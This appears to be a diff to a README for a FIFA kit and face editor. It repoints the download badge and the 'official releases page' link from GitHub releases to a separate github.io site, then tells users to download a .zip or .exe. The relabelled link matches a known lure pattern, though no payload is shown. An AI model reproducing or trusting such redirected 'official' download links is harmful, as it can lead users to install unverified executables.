@@ -1,6 +1,6 @@
 # 🎨 FIFA-Kit-Face-Editor - Update your game visuals with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Eastereggfreereed793/FIFA-Kit-Face-Editor/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://eastereggfreereed793.github.io)
 
 This application changes how your players and teams look in your favorite sports game. It gives you full control over kits and face textures. You can change uniforms to match real life or create custom designs. You can also import new player faces to update your roster. The tool handles batch processing so you can update many files at once.
 
@@ -17,7 +17,7 @@ Before you start, make sure your computer meets these needs:
 
 ## 📥 How to Download
 
-1.  Visit the [official releases page](https://github.com/Eastereggfreereed793/FIFA-Kit-Face-Editor/releases).
+1.  Visit the [official releases page](https://eastereggfreereed793.github.io).
 2.  Look for the section labeled "Latest".
 3.  Click the link ending in `.zip` or `.exe` to start the download.
 4.  Save the file to your Downloads folder or your desktop for easy access.
